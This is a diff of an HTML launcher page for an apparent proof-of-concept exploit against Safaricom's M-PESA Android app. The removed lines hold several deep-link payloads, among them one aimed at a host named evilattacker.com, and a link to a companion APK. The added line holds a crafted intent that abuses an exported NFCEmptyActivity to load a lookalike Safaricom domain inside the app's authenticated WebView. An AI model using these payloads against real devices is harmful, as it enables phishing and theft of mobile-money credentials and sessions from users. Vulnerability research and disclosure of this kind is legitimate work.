@@ -53,17 +53,11 @@
             padding: 14px 20px;
             border-radius: 6px;
             text-decoration: none;
+            margin-top: 20px;
             box-shadow: 0 2px 8px rgba(0, 166, 81, 0.4);
-            word-break: break-all;
         }
         .launch-btn:hover {
-            opacity: 0.9;
-        }
-        .btn-group {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 20px;
+            background-color: #008f45;
         }
     </style>
 </head>
@@ -71,27 +65,13 @@
     <div class="container">
         <h2>M-PESA PoC Launcher</h2>
         <div class="notice">
-            <strong>Prerequisite:</strong> Ensure the Safaricom M-PESA app is logged in or running in the background before tapping any link below.
+            <strong>Prerequisite:</strong> Ensure the Safaricom M-PESA app is logged in or running in the background before tapping the button below.
         </div>
-        <p>Select any link format below to trigger the verified deep link handlers into M-PESA:</p>
+        <p>Tapping the button triggers the exported <code>NFCEmptyActivity</code> router, forcing M-PESA to open the external target webpage directly inside its authenticated in-app browser frame.</p>
         
-        <div class="btn-group">
-            <a class="launch-btn" href="intent:///webViewModule/webview?url=https%3A%2F%2Fsafaricom.co.ke.185.199.108.153.sslip.io%2F%3Fv%3D4#Intent;scheme=fintechoneapp;package=com.safaricom.mpesa.lifestyle;end">
-                🚀 Method 1: In-App WebView (intent:// wrapper)
-            </a>
-
-            <a class="launch-btn" style="background-color: #1a5fb4;" href="fintechoneapp:///webViewModule/webview?url=https%3A%2F%2Fsafaricom.co.ke.185.199.108.153.sslip.io%2F%3Fv%3D4">
-                🌐 Method 2: Direct fintechoneapp://
-            </a>
-
-            <a class="launch-btn" style="background-color: #7b1fa2;" href="intent://safaricom.co.ke.evilattacker.com/?bundleLink=1&bundle_type=allInOne&offerId=0#Intent;scheme=fintechoneapp;package=com.safaricom.mpesa.lifestyle;end">
-                📦 Method 3: Deep Link Router (All-in-One)
-            </a>
-
-            <a class="launch-btn" style="background-color: #475569;" href="https://raw.githubusercontent.com/singknowcollab/mpesa-webview-bridge-poc/master/MpesaNfcPoC.apk">
-                📱 Download Companion PoC APK (Direct NFC Vector)
-            </a>
-        </div>
+        <a class="launch-btn" href="intent:#Intent;component=com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity;S.saveUri=safaricomnfcpay%3A%2F%2Fopenapp%3Froute%3Dhttps%253A%252F%252Fsafaricom.co.ke.185.199.108.153.sslip.io%252F%253Fv%253D4;end">
+            🚀 Launch In-App WebView
+        </a>
     </div>
 </body>
 </html>
